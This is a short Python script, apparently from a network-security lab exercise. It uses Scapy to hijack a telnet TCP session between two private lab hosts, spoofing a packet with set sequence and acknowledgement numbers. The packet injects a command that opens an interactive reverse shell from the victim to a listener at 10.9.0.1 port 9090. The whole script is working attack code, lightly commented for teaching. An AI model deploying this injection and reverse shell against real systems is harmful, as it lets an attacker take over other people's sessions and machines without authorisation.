#!/usr/bin/env python3
from scapy.all import *

ip  = IP(src="10.9.0.6", dst="10.9.0.5") #IP address of User1 and Victim
tcp = TCP(sport=47102, dport=23, flags="A", seq=795078597, ack=1603630107) #source port number; destination port as 23 means telnet; flag A means Acknowledgement; Sequence number and acknowledgement number
data = "\n/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\n" #This command will open a new interactive shell in the victim and run the command; here 1 = stdout and 2 = stderr
pkt = ip/tcp/data #construct TCP packet
ls(pkt)
send(pkt,iface='br-c83e1ac99060', verbose=0) #sends the packets
